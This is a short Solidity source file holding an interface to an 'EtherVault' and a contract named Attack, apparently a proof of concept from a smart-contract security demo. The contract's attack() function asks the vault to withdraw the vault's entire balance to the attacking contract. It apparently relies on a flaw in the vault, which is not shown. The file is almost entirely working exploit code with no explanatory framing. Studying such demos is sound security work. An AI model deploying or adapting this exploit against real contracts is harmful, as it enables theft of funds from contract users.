// SPDX-License-Identifier: BSL-1.0 (Boost Software License 1.0)

//--------------------------------------------------------------------------//
// Copyright 2022 serial-coder: Phuwanai Thummavet (mr.thummavet@gmail.com) //
//--------------------------------------------------------------------------//

pragma solidity 0.6.12;

interface IEtherVault {
    function withdraw(uint256 _amount) external;
    function getEtherBalance() external view returns (uint256);
}

contract Attack {
    IEtherVault public immutable etherVault;

    constructor(IEtherVault _etherVault) public {
        etherVault = _etherVault;
    }

    receive() external payable {}

    function attack() external {
        etherVault.withdraw(etherVault.getEtherBalance());
    }

    function getEtherBalance() external view returns (uint256) {
        return address(this).balance;
    }
}